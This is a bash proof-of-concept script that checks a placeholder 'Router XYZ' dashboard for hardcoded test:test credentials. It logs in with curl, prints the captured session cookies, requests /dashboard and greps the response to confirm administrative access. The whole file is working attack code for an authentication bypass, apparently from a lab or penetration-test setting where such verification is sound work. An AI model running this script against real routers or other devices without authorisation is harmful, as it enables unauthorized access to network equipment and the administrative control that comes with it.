#!/bin/bash

# POC: Default Credentials Authentication Bypass
# Target: Router XYZ Management Dashboard
# Vulnerability: Hardcoded test credentials (test:test) enable authentication bypass

TARGET_URL="${1:-http://localhost}"
COOKIES_FILE="/tmp/router_cookies_$$.txt"

echo "[*] Default Credentials Authentication Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Attempt login with default credentials
echo "[+] Step 1: Attempting login with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[+] Login response received"
echo "[*] Response preview: $(echo "$LOGIN_RESPONSE" | head -c 200)..."
echo ""

# Step 2: Check if authentication was successful by checking dashboard access
echo "[+] Step 2: Checking cookies file..."
if [ -f "$COOKIES_FILE" ]; then
    echo "[+] Cookies file created"
    cat "$COOKIES_FILE"
    echo ""
fi

# Step 3: Try to access protected dashboard with the session
echo "[+] Step 3: Accessing /dashboard with authentication attempt..."
DASHBOARD_RESPONSE=$(curl -s -b "$COOKIES_FILE" -v "$TARGET_URL/dashboard" 2>&1)

# Check if we got dashboard content (not login form/error)
if echo "$DASHBOARD_RESPONSE" | grep -q "Router XYZ Dashboard"; then
    echo "[✓] SUCCESS: Authenticated dashboard access confirmed!"
    echo "[✓] Dashboard contains: 'Router XYZ Dashboard'"
    
    # Extract welcome message if present
    if echo "$DASHBOARD_RESPONSE" | grep -q "Welcome"; then
        WELCOME=$(echo "$DASHBOARD_RESPONSE" | grep -o "Welcome[^<]*" | head -1)
        echo "[✓] Welcome message: $WELCOME"
    fi
    
    # Check for admin features mention
    if echo "$DASHBOARD_RESPONSE" | grep -q "Administrator"; then
        echo "[✓] Admin features accessible to authenticated user"
    fi
    
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Default credentials enable full dashboard access"
    
    # Cleanup
    rm -f "$COOKIES_FILE"
    exit 0
elif echo "$DASHBOARD_RESPONSE" | grep -q "HTTP/.*200"; then
    echo "[+] Dashboard returned HTTP 200 status"
    
    # Check response body for dashboard content
    BODY=$(echo "$DASHBOARD_RESPONSE" | tail -1)
    if echo "$BODY" | grep -q "Router XYZ Dashboard\|Welcome"; then
        echo "[✓] SUCCESS: Dashboard content accessible with authenticated session"
        echo "[!] VULNERABILITY CONFIRMED: Default credentials enable full access"
        rm -f "$COOKIES_FILE"
        exit 0
    fi
fi

# If we reach here, check if the test account exists by examining response
if echo "$LOGIN_RESPONSE" | grep -qi "success\|welcome\|dashboard"; then
    echo "[✓] Login response indicates successful authentication"
    echo "[!] VULNERABILITY CONFIRMED: Default credentials are functional"
    rm -f "$COOKIES_FILE"
    exit 0
fi

echo "[-] Dashboard access verification inconclusive"
echo "[-] Response: $(echo "$DASHBOARD_RESPONSE" | tail -1 | head -c 300)..."

# Cleanup
rm -f "$COOKIES_FILE"
exit 1